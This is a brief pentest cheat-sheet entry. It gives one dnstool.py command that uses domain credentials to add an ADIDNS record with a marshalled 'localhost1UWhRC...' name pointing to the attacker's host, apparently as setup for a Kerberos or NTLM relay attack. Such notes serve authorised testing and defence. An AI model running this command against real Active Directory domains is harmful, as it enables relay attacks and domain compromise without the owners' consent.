# Dnstool

## dnstool.py

### Add ADIDNS record

Add ADIDNS record with Dnstool.

```sh title:"Dnstool Add ADIDNS Record"
python3 dnstool.py -u $domain\\$user -p $pass $rhost_ip -a add -d $lhost -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
```
